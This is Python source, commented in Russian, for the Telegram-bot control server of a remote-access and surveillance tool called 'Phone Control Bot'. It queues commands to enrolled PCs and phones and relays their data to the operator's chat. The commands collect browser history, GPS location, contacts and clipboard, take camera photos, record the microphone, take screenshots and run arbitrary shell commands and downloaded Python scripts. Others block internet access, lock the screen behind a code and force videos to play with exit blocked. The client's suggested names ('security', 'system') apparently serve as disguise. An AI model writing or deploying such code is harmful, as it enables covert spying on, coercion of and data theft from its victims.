from fastapi import FastAPI, Header, HTTPException, UploadFile, File, Form
from fastapi.responses import StreamingResponse
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from typing import Optional
import os
import tempfile
import asyncio
import httpx
from datetime import datetime
import uuid
import urllib.parse

app = FastAPI()

# ─── Fix для Amvera: health-check приходит на //health ───────────────────────

class NormalizeSlashMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        scope = request.scope
        if scope["path"].startswith("//"):
            scope["path"] = scope["path"][1:]
        return await call_next(request)

app.add_middleware(NormalizeSlashMiddleware)

# ─── Состояние ───────────────────────────────────────────────────────────────

devices: dict = {}

state = {
    "raw_links": [],
    "video_sessions": {},    # chat_id -> session
    "msg_sessions": {},      # chat_id -> {step, mode, questions[], answers[], cur_q, pending_cmd}
    "code_sessions": {},     # chat_id -> {step, secret, text, allow_media}
    "selected_device": {},   # chat_id -> device_id
    "questions": [],         # глобальный список вопросов опросника
    "micro_sessions": {},    # chat_id -> {step, dev_id, device_index, device_name}
}

# Уникальный ID этого запуска сервера — меняется при каждом рестарте
INSTANCE_ID = str(uuid.uuid4())[:8]

BOT_TOKEN        = os.environ.get("BOT_TOKEN", "")
ALLOWED_CHAT_ID  = os.environ.get("ALLOWED_CHAT_ID", "")
DEVICE_SECRET    = os.environ.get("DEVICE_SECRET", "mysecret42")
SELF_URL         = os.environ.get("SELF_URL", "")

VALID_NAMES = ["android", "security", "безопасность", "звонки", "system", "phonecontrol"]

# ─── Keep-alive ───────────────────────────────────────────────────────────────

async def keep_alive():
    await asyncio.sleep(60)
    while True:
        try:
            if SELF_URL:
                async with httpx.AsyncClient(timeout=10) as client:
                    await client.get(f"{SELF_URL}/health")
        except Exception as e:
            print(f"keep_alive error: {e}")
        await asyncio.sleep(270)

@app.on_event("startup")
async def startup():
    asyncio.create_task(keep_alive())

# ─── Telegram helpers ─────────────────────────────────────────────────────────

async def send_tg(chat_id: str, text: str, reply_markup=None):
    if not BOT_TOKEN:
        print("send_tg: BOT_TOKEN не задан!")
        return
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
            print(f"send_tg -> {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"send_tg error: {e}")

async def answer_callback(cb_id: str, text: str = ""):
    if not BOT_TOKEN:
        return
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                json={"callback_query_id": cb_id, "text": text}
            )
    except Exception as e:
        print(f"answer_callback error: {e}")

async def send_tg_file(chat_id: str, file_bytes: bytes, filename: str,
                       caption: str = "", reply_markup: dict = None):
    """Проксируем файл с телефона в Telegram. Если > 45MB — разбиваем на части."""
    if not BOT_TOKEN:
        return
    ext = filename.lower().rsplit(".", 1)[-1] if "." in filename else ""
    if ext in ("jpg", "jpeg", "png", "webp", "gif"):
        method = "sendPhoto"
        field  = "photo"
    elif ext in ("mp4", "mov", "avi", "mkv", "3gp"):
        method = "sendVideo"
        field  = "video"
    else:
        method = "sendDocument"
        field  = "document"

    PART_SIZE = 45 * 1024 * 1024  # 45 MB

    total = len(file_bytes)
    if total <= PART_SIZE:
        try:
            async with httpx.AsyncClient(timeout=120) as client:
                files = {field: (filename, file_bytes)}
                data  = {"chat_id": chat_id, "parse_mode": "Markdown"}
                if caption:
                    data["caption"] = caption
                if reply_markup:
                    import json as _json
                    data["reply_markup"] = _json.dumps(reply_markup)
                await client.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                    data=data, files=files
                )
        except Exception as e:
            print(f"send_tg_file error: {e}")
        return

    # Разбиваем на равные части
    num_parts = (total + PART_SIZE - 1) // PART_SIZE
    part_size = (total + num_parts - 1) // num_parts  # равномерное разбиение

    print(f"send_tg_file: {filename} {total/1024/1024:.1f}MB -> {num_parts} parts")

    base_name = filename.rsplit(".", 1)[0] if "." in filename else filename
    for i in range(num_parts):
        start = i * part_size
        end   = min(start + part_size, total)
        chunk = file_bytes[start:end]
        part_name = f"{base_name}_part{i+1}of{num_parts}.{ext}"
        part_caption = f"{caption + ' ' if caption else ''}[{i+1}/{num_parts}]"
        try:
            async with httpx.AsyncClient(timeout=120) as client:
                files = {"document": (part_name, chunk)}
                data  = {"chat_id": chat_id, "caption": part_caption}
                r = await client.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    data=data, files=files
                )
                print(f"send_tg_file part {i+1}/{num_parts} -> {r.status_code}")
        except Exception as e:
            print(f"send_tg_file part {i+1} error: {e}")

# ─── Device helpers ───────────────────────────────────────────────────────────

def get_device(device_id: str) -> dict:
    if device_id not in devices:
        devices[device_id] = {
            "model": "Unknown",
            "platform": "windows",
            "last_seen": None,
            "active": False,
            "pending_commands": [],
            "command_callbacks": {},
        }
    return devices[device_id]

def device_online(device_id: str) -> bool:
    d = devices.get(device_id)
    if not d or not d["last_seen"]:
        return False
    return (datetime.now() - d["last_seen"]).total_seconds() < 120

def device_last_seen_str(device_id: str) -> str:
    d = devices.get(device_id)
    if not d or not d["last_seen"]:
        return "никогда"
    delta = int((datetime.now() - d["last_seen"]).total_seconds())
    return f"{delta} сек назад" if delta < 60 else f"{delta // 60} мин назад"

def selected_device_id(chat_id: str) -> Optional[str]:
    sel = state["selected_device"].get(chat_id)
    if isinstance(sel, list):
        return sel[0] if len(sel) == 1 else None
    return sel

def selected_device_ids(chat_id: str) -> list[str]:
    """Возвращает список выбранных device_id для данного chat_id."""
    sel = state["selected_device"].get(chat_id)
    if sel is None:
        return []
    if sel == "all":
        return [d for d in devices if device_online(d)]
    if isinstance(sel, list):
        return [d for d in sel if d in devices]
    return [sel] if sel in devices else []

def require_device(chat_id: str):
    """Возвращает (dev_id, None) или (None, err)."""
    ids = require_devices(chat_id)
    if isinstance(ids, str):
        return None, ids
    return ids[0], None

def require_devices(chat_id: str):
    """Возвращает список device_id или строку с ошибкой."""
    # Скрываем офлайн устройства из рассмотрения
    online_ids = [d for d in devices if device_online(d)]
    if not online_ids:
        return "⚠️ Нет онлайн устройств."
    ids = selected_device_ids(chat_id)
    # Оставляем только онлайн из выбранных
    ids = [i for i in ids if i in devices and device_online(i)]
    if not ids:
        if len(online_ids) == 1:
            dev_id = online_ids[0]
            state["selected_device"][chat_id] = dev_id
            ids = [dev_id]
        else:
            return "⚠️ Выбери устройство командой /devices"
    active = [i for i in ids if devices[i]["active"]]
    if not active:
        return "⚠️ Сначала включи режим командой /on"
    return active

# ─── Command queue ────────────────────────────────────────────────────────────

async def enqueue_command(chat_id: str, dev_id: str, cmd: dict, description: str):
    """Отправить команду на одно устройство."""
    import copy
    d = devices[dev_id]
    if not device_online(dev_id):
        await send_tg(chat_id,
            f"⚠️ Устройство оффлайн (ping: {device_last_seen_str(dev_id)})\nКоманда добавлена в очередь.")
    else:
        await send_tg(chat_id, "📡 Отправляю команду...")
    cmd_copy = copy.deepcopy(cmd)
    cmd_id = str(uuid.uuid4())[:8]
    cmd_copy["_id"] = cmd_id
    d["pending_commands"].append(cmd_copy)
    d["command_callbacks"][cmd_id] = chat_id
    await send_tg(chat_id, f"✅ Команда `{description}` в очереди (ID: `{cmd_id}`)")

async def enqueue_multi(chat_id: str, cmd: dict, description: str):
    """Отправить команду на все выбранные устройства."""
    ids = require_devices(chat_id)
    if isinstance(ids, str):
        await send_tg(chat_id, ids)
        return
    for dev_id in ids:
        await enqueue_command(chat_id, dev_id, cmd, description)

# ─── Keyboards ────────────────────────────────────────────────────────────────

def main_keyboard():
    """Постоянная клавиатура с быстрыми кнопками."""
    return {
        "keyboard": [
            [{"text": "/status"}, {"text": "/devices"}],
            [{"text": "/on"},     {"text": "/help"}],
        ],
        "resize_keyboard": True,
        "persistent": True,
    }

def msg_mode_keyboard():
    return {"inline_keyboard": [[
        {"text": "💬 Обычное",   "callback_data": "msg_plain"},
        {"text": "✏️ С ответом", "callback_data": "msg_reply"},
        {"text": "📋 Опросник",  "callback_data": "msg_survey"},
    ]]}

def msg_minimize_keyboard():
    return {"inline_keyboard": [[
        {"text": "🖥 Свернуть всё + эффект", "callback_data": "msg_minimize_yes"},
        {"text": "▶️ Просто показать",        "callback_data": "msg_minimize_no"},
    ]]}

def code_media_keyboard():
    return {"inline_keyboard": [[
        {"text": "📸 Разрешить фото/видео", "callback_data": "code_media_yes"},
        {"text": "🚫 Только код",           "callback_data": "code_media_no"},
    ]]}

def code_confirm_keyboard(dev_id: str, chat_id: str):
    return {"inline_keyboard": [[
        {"text": "✅ Разрешить",  "callback_data": f"code_approve|{dev_id}|{chat_id}"},
        {"text": "❌ Отклонить", "callback_data": f"code_deny|{dev_id}|{chat_id}"},
    ]]}

def video_mode_keyboard():
    return {"inline_keyboard": [[
        {"text": "▶️ Просто показать",   "callback_data": "vmsg_plain"},
        {"text": "✏️ С ответом",          "callback_data": "vmsg_reply"},
        {"text": "📋 С опросником",       "callback_data": "vmsg_survey"},
    ]]}

def video_lock_keyboard():
    return {"inline_keyboard": [[
        {"text": "🔓 Без блокировки",      "callback_data": "vlock_no"},
        {"text": "🔒 Заблокировать выход", "callback_data": "vlock_yes"},
    ]]}

def video_minimize_keyboard():
    return {"inline_keyboard": [[
        {"text": "🖥 Свернуть всё + эффект", "callback_data": "vmsg_minimize_yes"},
        {"text": "▶️ Просто показать",        "callback_data": "vmsg_minimize_no"},
    ]]}

def devices_keyboard(chat_id: str = ""):
    rows = []
    selected = state["selected_device"].get(chat_id)
    for dev_id, d in devices.items():
        online = device_online(dev_id)
        # Скрываем офлайн устройства из списка
        if not online:
            continue
        status = "🟢"
        if selected == "all":
            mark = "✓ "
        elif isinstance(selected, list) and dev_id in selected:
            mark = "✓ "
        elif selected == dev_id:
            mark = "✓ "
        else:
            mark = ""
        rows.append([{"text": f"{mark}{status} {d['model']} ({dev_id[:6]})",
                      "callback_data": f"sel_{dev_id}"}])
    if len(devices) > 1:
        rows.append([{"text": "📡 Все устройства", "callback_data": "sel_all"}])
    return {"inline_keyboard": rows}

# ─── Video flow ───────────────────────────────────────────────────────────────

async def start_video_flow(chat_id: str, video_cmd: str, video_num: int = 0, video_url: str = "", raw_num: int = 0):
    """Сначала спрашиваем режим обратной связи, потом блокировку."""
    state["video_sessions"][chat_id] = {
        "step": "mode",
        "video_cmd": video_cmd,
        "video_num": video_num,
        "video_url": video_url,
        "raw_num": raw_num,
        "lock": False,
        "duration": 0,
        "fb_mode": "plain",
        "minimize": False,
    }
    name = f"video{video_num}" if video_num else (f"raw{raw_num}" if raw_num else "raw видео")
    await send_tg(chat_id,
        f"🎬 *{name}*\n\nВыбери режим обратной связи:",
        reply_markup=video_mode_keyboard())

# ─── Msg session flow ─────────────────────────────────────────────────────────

async def start_msg_flow(chat_id: str, text: str, dev_id: str):
    state["msg_sessions"][chat_id] = {
        "step": "mode",
        "text": text,
        "dev_id": dev_id,
        "fb_mode": "plain",
    }
    await send_tg(chat_id,
        f"💬 *Сообщение:* _{text}_\n\nВыбери режим обратной связи:",
        reply_markup=msg_mode_keyboard())

# ─── Survey helpers ───────────────────────────────────────────────────────────

def build_survey_cmd(base_cmd: dict) -> dict:
    """Добавить список вопросов в команду."""
    base_cmd["survey"] = state["questions"]
    return base_cmd

# ─── Callback processing ──────────────────────────────────────────────────────

async def process_callback(callback: dict):
    chat_id = str(callback["message"]["chat"]["id"])
    data    = callback.get("data", "")
    cb_id   = callback["id"]

    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID:
        await answer_callback(cb_id, "⛔ Нет доступа")
        return

    # ── Выбор устройства ─────────────────────────────────────────────────────
    if data.startswith("sel_"):
        dev_id = data[4:]

        if dev_id == "all":
            state["selected_device"][chat_id] = "all"
            names = ", ".join(d["model"] for d in devices.values())
            await answer_callback(cb_id, "✅ Все устройства")
            await send_tg(chat_id,
                f"📡 Выбраны все устройства: *{names}*",
                reply_markup=devices_keyboard(chat_id))
            return

        if dev_id not in devices:
            await answer_callback(cb_id, "⚠️ Устройство не найдено")
            return

        current = state["selected_device"].get(chat_id)
        if current == "all":
            selected_list = [dev_id]
        elif isinstance(current, list):
            if dev_id in current:
                selected_list = [d for d in current if d != dev_id] or [dev_id]
            else:
                selected_list = current + [dev_id]
        elif current and current != dev_id:
            selected_list = [current, dev_id]
        else:
            selected_list = [dev_id]

        state["selected_device"][chat_id] = selected_list[0] if len(selected_list) == 1 else selected_list

        sel = state["selected_device"][chat_id]
        if isinstance(sel, list):
            names = ", ".join(devices[i]["model"] for i in sel if i in devices)
            text = f"📱 Выбрано {len(sel)} устройства: *{names}*\n\nНажми ещё раз на устройство чтобы снять выбор."
        else:
            d = devices[sel]
            online = "🟢 онлайн" if device_online(sel) else "🔴 оффлайн"
            text = f"📱 Выбрано: *{d['model']}*\nID: `{sel}`\nСтатус: {online}"

        await answer_callback(cb_id, "✅")
        await send_tg(chat_id, text, reply_markup=devices_keyboard(chat_id))
        return

    # ── /code flow — allow_media ───────────────────────────────────────────────
    csess = state["code_sessions"].get(chat_id)
    if csess and csess["step"] == "allow_media" and data in ("code_media_yes", "code_media_no"):
        csess["allow_media"] = (data == "code_media_yes")
        await answer_callback(cb_id)
        state["code_sessions"].pop(chat_id, None)

        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err); return

        cmd = {
            "cmd":         "code_lock",
            "secret":      csess["secret"],
            "text":        csess["text"],
            "allow_media": csess["allow_media"],
        }
        await enqueue_multi(chat_id, cmd, "code_lock")
        return

    # ── Подтверждение фото/видео от телефона ──────────────────────────────────
    if data.startswith("code_approve|") or data.startswith("code_deny|"):
        parts   = data.split("|")
        action  = parts[0]        # code_approve / code_deny
        dev_id  = parts[1] if len(parts) > 1 else ""
        tgt_cid = parts[2] if len(parts) > 2 else chat_id
        await answer_callback(cb_id)

        result_cmd = "code_unlock" if action == "code_approve" else "code_denied"
        if dev_id:
            await enqueue_command(tgt_cid, dev_id, {"cmd": result_cmd}, result_cmd)
        else:
            await enqueue_multi(tgt_cid, {"cmd": result_cmd}, result_cmd)

        status = "✅ Разблокировано" if action == "code_approve" else "❌ Отклонено"
        await send_tg(chat_id, status)
        return

    # ── Режим сообщения (/msg flow) ───────────────────────────────────────────
    msess = state["msg_sessions"].get(chat_id)
    if msess and msess["step"] == "mode" and data in ("msg_plain", "msg_reply", "msg_survey"):
        mode_map = {"msg_plain": "plain", "msg_reply": "reply", "msg_survey": "survey"}
        msess["fb_mode"] = mode_map[data]
        await answer_callback(cb_id)

        if msess["fb_mode"] == "survey" and not state["questions"]:
            state["msg_sessions"].pop(chat_id, None)
            await send_tg(chat_id, "⚠️ Список вопросов пуст. Добавь через /addq <вопрос>")
            return

        # Все режимы спрашивают про minimize/эффект
        msess["step"] = "minimize"
        await send_tg(chat_id, "🖥 Свернуть все окна перед показом?",
                      reply_markup=msg_minimize_keyboard())
        return

    if msess and msess["step"] == "minimize" and data in ("msg_minimize_yes", "msg_minimize_no"):
        msess["minimize"] = (data == "msg_minimize_yes")
        await answer_callback(cb_id)

        cmd = {
            "cmd": "show_message",
            "text": msess["text"],
            "fb_mode": msess["fb_mode"],
            "minimize": msess["minimize"],
        }
        if msess["fb_mode"] == "survey":
            build_survey_cmd(cmd)
        if msess["fb_mode"] == "reply":
            cmd["reply_prompt"] = "✏️ Напиши ответ:"
        state["msg_sessions"].pop(chat_id, None)
        await enqueue_multi(chat_id, cmd, "сообщение")
        return

    # ── Микрофон: ожидаем количество секунд ─────────────────────────────────
    msess = state["micro_sessions"].get(chat_id)
    if msess and msess.get("step") == "choose_seconds":
        if not data.isdigit():
            await send_tg(chat_id, "⚠️ Введи число секунд (1-300)")
            return
        seconds = max(1, min(int(data), 300))
        state["micro_sessions"].pop(chat_id, None)
        dev_id = msess["dev_id"]
        device_index = msess["device_index"]
        device_name = msess["device_name"]
        await send_tg(chat_id,
            f"🎙 Записываю *{seconds} сек* с микрофона *{device_name}*...")
        await enqueue_command(chat_id, dev_id,
            {"cmd": "record_audio", "seconds": seconds, "device_index": device_index},
            f"запись микрофона {seconds} сек")
        return

    vsess = state["video_sessions"].get(chat_id)
    if vsess:
        if vsess["step"] == "mode" and data in ("vmsg_plain", "vmsg_reply", "vmsg_survey"):
            mode_map = {"vmsg_plain": "plain", "vmsg_reply": "reply", "vmsg_survey": "survey"}
            vsess["fb_mode"] = mode_map[data]
            vsess["step"] = "lock"
            await answer_callback(cb_id)
            if vsess["fb_mode"] == "survey" and not state["questions"]:
                state["video_sessions"].pop(chat_id, None)
                await send_tg(chat_id, "⚠️ Список вопросов пуст. Добавь через /addq <вопрос>")
                return
            name = f"video{vsess['video_num']}" if vsess["video_num"] else "raw видео"
            await send_tg(chat_id,
                f"🎬 *{name}*\n\nЗаблокировать выход?",
                reply_markup=video_lock_keyboard())
            return

        if vsess["step"] == "lock":
            if data == "vlock_no":
                vsess["lock"] = False
            elif data == "vlock_yes":
                vsess["lock"] = True
            else:
                await answer_callback(cb_id, "?")
                return
            vsess["step"] = "duration"
            await answer_callback(cb_id, "🔒" if vsess["lock"] else "🔓")
            await send_tg(chat_id,
                f"⏱ Сколько секунд обязательно смотреть? _(0 = смотреть видео до конца)_")
            return

        if vsess["step"] == "minimize" and data in ("vmsg_minimize_yes", "vmsg_minimize_no"):
            vsess["minimize"] = (data == "vmsg_minimize_yes")
            vsess["step"] = "done"
            state["video_sessions"].pop(chat_id, None)
            await answer_callback(cb_id)

            dev_id, err = require_device(chat_id)
            if err:
                await send_tg(chat_id, err)
                return

            lock_str = "🔒 заблокирован" if vsess["lock"] else "🔓 без блокировки"
            duration = vsess["duration"]
            dur_str  = f"{duration} сек" if duration > 0 else ("бесконечно" if vsess["lock"] else "без ограничения")
            await send_tg(chat_id, f"✅ Запускаю видео\nВыход: {lock_str}\nОбязательное время: {dur_str}")

            cmd = {"cmd": vsess["video_cmd"], "lock": vsess["lock"],
                   "duration": duration, "fb_mode": vsess["fb_mode"],
                   "minimize": vsess["minimize"]}
            if vsess["video_cmd"] == "video":
                cmd["num"] = vsess["video_num"]
                desc = f"video{vsess['video_num']}"
            else:
                cmd["raw_num"] = vsess.get("raw_num", 0)
                desc = f"raw{vsess.get('raw_num', '?')}"

            if vsess["fb_mode"] == "survey":
                build_survey_cmd(cmd)
            elif vsess["fb_mode"] == "reply":
                cmd["reply_prompt"] = "✏️ Напиши ответ:"

            await enqueue_multi(chat_id, cmd, desc)
            return

    # ── Микрофон ──────────────────────────────────────────────────────────────
    if data == "micro_cancel":
        state["micro_sessions"].pop(chat_id, None)
        await answer_callback(cb_id, "Отменено")
        await send_tg(chat_id, "❌ Запись отменена.")
        return

    if data.startswith("micro_dev:"):
        sess = state["micro_sessions"].get(chat_id)
        if not sess:
            await answer_callback(cb_id, "Сессия устарела")
            return
        device_index = int(data.split(":")[1])
        device_name = next(
            (d["name"] for d in sess.get("devices_list", []) if d["index"] == device_index),
            str(device_index)
        )
        sess["device_index"] = device_index
        sess["device_name"] = device_name
        sess["step"] = "choose_seconds"
        state["micro_sessions"][chat_id] = sess
        await answer_callback(cb_id)
        await send_tg(chat_id,
            f"🎙 Выбран: *{device_name}*\n\n⏱ Сколько секунд записывать?\n(отправь число от 1 до 300)")
        return

    await answer_callback(cb_id, "?")

# ─── Message processing ───────────────────────────────────────────────────────

async def process_update(update: dict):
    print(f"process_update: {list(update.keys())}")
    if "callback_query" in update:
        await process_callback(update["callback_query"])
        return

    msg = update.get("message") or update.get("edited_message")
    if not msg:
        print("process_update: нет message, пропускаю")
        return

    chat_id = str(msg["chat"]["id"])
    text    = msg.get("text", "").strip()
    print(f"process_update: chat_id={chat_id}, ALLOWED={ALLOWED_CHAT_ID}, text={text!r}")

    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID:
        await send_tg(chat_id, "⛔ Нет доступа.")
        return

    # ── Файл прикреплён к /addraw ─────────────────────────────────────────
    doc = msg.get("document") or msg.get("video")
    caption = msg.get("caption", "").strip()
    if doc and caption.startswith("/addraw"):
        file_id   = doc.get("file_id", "")
        file_name = doc.get("file_name") or "video.mp4"
        file_size = doc.get("file_size", 0)

        if file_size > 20 * 1024 * 1024:
            await send_tg(chat_id, "⚠️ Файл больше 20 MB — Telegram Bot API не позволяет скачать. Используй /addraw <url>.")
            return

        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return

        await send_tg(chat_id, "📥 Скачиваю файл с Telegram...")
        try:
            async with httpx.AsyncClient(timeout=60) as hc:
                r = await hc.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}")
                file_path = r.json()["result"]["file_path"]
                r2 = await hc.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}")
                file_bytes = r2.content

            import uuid, pathlib
            token = uuid.uuid4().hex
            tmp_dir = pathlib.Path(tempfile.gettempdir()) / "pc_uploads"
            tmp_dir.mkdir(exist_ok=True)
            tmp_path = tmp_dir / f"{token}_{file_name}"
            tmp_path.write_bytes(file_bytes)
            _temp_uploads[token] = str(tmp_path)

            download_url = f"{SELF_URL}/tmp_video/{token}"
            await enqueue_multi(chat_id,
                {"cmd": "prefetch", "url": download_url, "filename": file_name},
                "скачать видео")
            await send_tg(chat_id, f"✅ Файл получен, отправлен на ПК. Появится в /lists после скачивания.")
        except Exception as e:
            await send_tg(chat_id, f"⚠️ Ошибка: {e}")
        return

    # ── Микрофон: ожидаем количество секунд ─────────────────────────────────
    msess = state["micro_sessions"].get(chat_id)
    if msess and msess.get("step") == "choose_seconds":
        if not text.isdigit():
            await send_tg(chat_id, "⚠️ Введи число секунд (1-300)")
            return
        seconds = max(1, min(int(text), 300))
        state["micro_sessions"].pop(chat_id, None)
        dev_id = msess["dev_id"]
        device_index = msess["device_index"]
        device_name = msess["device_name"]
        await send_tg(chat_id,
            f"🎙 Записываю *{seconds} сек* с микрофона *{device_name}*...")
        await enqueue_command(chat_id, dev_id,
            {"cmd": "record_audio", "seconds": seconds, "device_index": device_index},
            f"запись микрофона {seconds} сек")
        return

    # ── Видео: ожидаем duration ───────────────────────────────────────────────
    vsess = state["video_sessions"].get(chat_id)
    if vsess and vsess["step"] == "duration":
        if not text.isdigit():
            await send_tg(chat_id, "⚠️ Введи число секунд (или 0)")
            return
        duration = int(text)
        vsess["duration"] = duration
        vsess["step"] = "minimize"
        await send_tg(chat_id, "🖥 Свернуть все окна перед запуском видео?",
                      reply_markup=video_minimize_keyboard())
        return

    # ── Команды ───────────────────────────────────────────────────────────────

    if text in ("/start", "/help"):
        cur = selected_device_id(chat_id)
        cur_str = f"\nУстройство: *{devices[cur]['model']}*" if cur and cur in devices else ""
        await send_tg(chat_id, (
            "📱 *Phone Control Bot*\n\n"
            "*Устройства:*\n"
            "/devices — выбрать устройство\n"
            f"{cur_str}\n\n"
            "*Управление:*\n"
            "/on /off /status\n\n"
            "*Команды:*\n"
            "/shutdown /dnd /ban /unban\n"
            "/msg <текст> — сообщение (выбор режима ОС)\n"
            "/sound <0-10>\n\n"
            "*Видео:*\n"
            "/video1 /video2 /video3\n"
            "/addraw <url> /lists /raw <n> /delvideo <n>\n"
            "/unbanvideo\n\n"
            "*Опросник:*\n"
            "/addq <вопрос> — добавить вопрос\n"
            "/delq <номер> — удалить вопрос\n"
            "/questions — список вопросов\n\n"
            "*Файлы с телефона:*\n"
            "/getfiles — открыть галерею на телефоне\n"
            "/camera — открыть камеру на телефоне\n"
            "/screenshot — скриншот экрана ПК\n\n"
            "*Прочее:*\n"
            f"/name <имя> | Имена: {', '.join(VALID_NAMES)}\n\n"
            "*Микрофон:*\n"
            "/micro <сек> — записать аудио с микрофона ПК\n\n"
            "*Терминал:*\n"
            "/cmd <команда> — выполнить команду на ПК (лог в чат)\n\n"
            "*Python скрипты:*\n"
            "/listpy — список скриптов\n"
            "/addpy <url> — скачать скрипт\n"
            "/runpy <n> — запустить скрипт\n"
            "/delpy <n> — удалить скрипт\n\n"
            "*WiFi стриминг экрана ПК:*\n"
            "/stream\\_start — запустить трансляцию экрана\n"
            "/stream\\_stop — остановить трансляцию\n\n"
            "*Разведка:*\n"
            "/history — история браузеров за 7 дней\n"
            "/history <дней> — за указанное кол-во дней\n"
            "/location — GPS координаты\n"
            "/contacts — список контактов\n"
            "/apps — установленные приложения\n"
            "/clipboard — буфер обмена\n\n"
            "*Управление устройством:*\n"
            "/brightness <0-100> — яркость\n"
            "/vibrate — вибрация\n"
            "/flashon /flashoff — фонарик\n"
            "/photo — фото основной камерой\n"
            "/photof — фото фронтальной камерой"
        ), reply_markup=main_keyboard())

    elif text == "/devices":
        if not devices:
            await send_tg(chat_id, "📵 Нет подключённых устройств.")
            return
        cur = selected_device_id(chat_id)
        cur_str = f"Выбрано: *{devices[cur]['model']}*\n\n" if cur and cur in devices else ""
        await send_tg(chat_id, f"📱 *Выбери устройство:*\n{cur_str}",
                      reply_markup=devices_keyboard(chat_id))

    elif text == "/on":
        online_devs = [d for d in devices if device_online(d)]
        if not online_devs:
            await send_tg(chat_id, "⚠️ Нет онлайн устройств.")
            return
        ids = selected_device_ids(chat_id)
        ids = [i for i in ids if i in devices and device_online(i)]
        if not ids:
            if len(online_devs) == 1:
                ids = online_devs
                state["selected_device"][chat_id] = online_devs[0]
            else:
                await send_tg(chat_id, "⚠️ Выбери устройство /devices")
                return
        lines = []
        for dev_id in ids:
            devices[dev_id]["active"] = True
            devices[dev_id]["pending_commands"] = []
            lines.append(f"{devices[dev_id]['model']}: 🟢 онлайн")
        await send_tg(chat_id, "✅ *Включён* " + (f"{', '.join(d for d in [devices[i]['model'] for i in ids])}:\n" if len(ids) > 1 else "") + "\n".join(lines))

    elif text == "/off":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            devices[dev_id]["active"] = False
            devices[dev_id]["pending_commands"] = []
            await send_tg(chat_id, f"🔕 Выключен для *{devices[dev_id]['model']}*.")

    elif text == "/status":
        if not devices:
            await send_tg(chat_id, "📵 Нет устройств.")
            return
        cur = selected_device_id(chat_id)
        lines = ["📊 *Статус*\n"]
        for dev_id, d in devices.items():
            m = "👉 " if dev_id == cur else "    "
            o = "🟢" if device_online(dev_id) else "🔴"
            lines.append(f"{m}{o} *{d['model']}* (`{dev_id[:6]}`)\n"
                         f"      ping: {device_last_seen_str(dev_id)} | "
                         f"режим: {'активен' if d['active'] else 'спит'} | "
                         f"очередь: {len(d['pending_commands'])}")
        await send_tg(chat_id, "\n".join(lines))

    elif text == "/shutdown":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "shutdown"}, "блокировка экрана")

    elif text == "/dnd":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "dnd_off"}, "отключить DnD")

    elif text == "/ban":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "ban"}, "блок интернета")

    elif text == "/unban":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "unban"}, "разблок интернета")

    elif text == "/screenshot":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "screenshot"}, "скриншот экрана")

    elif text.startswith("/msg "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        message = text[5:].strip()
        if not message:
            await send_tg(chat_id, "⚠️ Укажи текст: /msg Привет")
            return
        await start_msg_flow(chat_id, message, dev_id)

    elif text.startswith("/code "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        secret = text[6:].strip()
        if not secret:
            await send_tg(chat_id, "⚠️ Укажи код: /code 1234")
            return
        # Сохраняем сессию, спрашиваем текст сообщения
        state["code_sessions"][chat_id] = {
            "step":        "text",
            "secret":      secret,
            "text":        "",
            "allow_media": False,
        }
        await send_tg(chat_id, "✏️ Напиши текст который увидит человек на экране:")
        return

    # ── /code flow — шаг text ─────────────────────────────────────────────────
    csess = state["code_sessions"].get(chat_id)
    if csess and csess["step"] == "text":
        csess["text"] = text
        csess["step"] = "allow_media"
        await send_tg(chat_id,
            f"📸 Разрешить отправку фото/видео как альтернативу коду?\n\n"
            f"_(Если да — ты получишь файл в бот с кнопками ✅/❌ для подтверждения)_",
            reply_markup=code_media_keyboard())
        return

    elif text in ("/video1", "/video2", "/video3"):
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await start_video_flow(chat_id, "video", video_num=int(text[-1]))

    elif text.startswith("/sound"):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            parts = text.split()
            if len(parts) != 2 or not parts[1].isdigit() or not (0 <= int(parts[1]) <= 10):
                await send_tg(chat_id, "⚠️ /sound 0-10")
                return
            level = int(parts[1])
            await enqueue_multi(chat_id, {"cmd": "sound", "level": level}, f"громкость {level}/10")

    elif text.startswith("/addraw "):
        url = text[8:].strip()
        if not url.startswith("http"):
            await send_tg(chat_id, "⚠️ Некорректная ссылка.")
            return
        if "drive.google.com/file/d/" in url:
            try:
                fid = url.split("/file/d/")[1].split("/")[0]
                url = f"https://drive.google.com/uc?export=download&confirm=t&id={fid}"
            except: pass
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        await enqueue_multi(chat_id,
            {"cmd": "prefetch", "url": url}, "скачать видео")
